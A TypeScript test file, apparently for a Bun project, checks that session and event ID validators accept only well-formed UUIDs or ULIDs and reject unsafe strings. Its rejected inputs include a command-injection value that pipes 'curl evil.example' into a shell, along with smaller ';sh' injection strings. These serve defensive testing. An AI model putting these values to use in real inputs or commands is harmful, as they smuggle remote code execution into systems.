import { test, expect } from "bun:test";
import { mintSessionId } from "../src/ids.ts";

test("mintSessionId returns a v7 UUID string, unique per call", () => {
  const a = mintSessionId();
  const b = mintSessionId();
  expect(a).toMatch(/^[0-9a-f]{8}-[0-9a-f]{4}-7[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/);
  expect(a).not.toBe(b);
});

test("SESSION_ID_RE accepts canonical UUIDs only, EVENT_ID_RE ULIDs and UUIDs", async () => {
  const { SESSION_ID_RE, EVENT_ID_RE } = await import("../src/ids.ts");
  expect(SESSION_ID_RE.test(mintSessionId())).toBe(true);
  expect(SESSION_ID_RE.test("0190A3E0-0000-7000-8000-00000000000F")).toBe(true);
  expect(SESSION_ID_RE.test("x; curl evil.example|sh #")).toBe(false);
  expect(SESSION_ID_RE.test(mintSessionId() + "\n")).toBe(false);
  expect(EVENT_ID_RE.test("01JAXYZ0000000000000000000")).toBe(true);
  expect(EVENT_ID_RE.test(mintSessionId())).toBe(true);
  expect(EVENT_ID_RE.test("a'b")).toBe(false);
  expect(EVENT_ID_RE.test("a".repeat(65))).toBe(false);
});

test("isShellSafeId / shellSafeIdChars keep to hex digits and dashes", async () => {
  const { isShellSafeId, shellSafeIdChars } = await import("../src/ids.ts");
  expect(isShellSafeId("0198abcd-1234")).toBe(true);
  expect(isShellSafeId("x;sh")).toBe(false);
  expect(shellSafeIdChars("0198'; sh #ab")).toBe("0198ab");
});
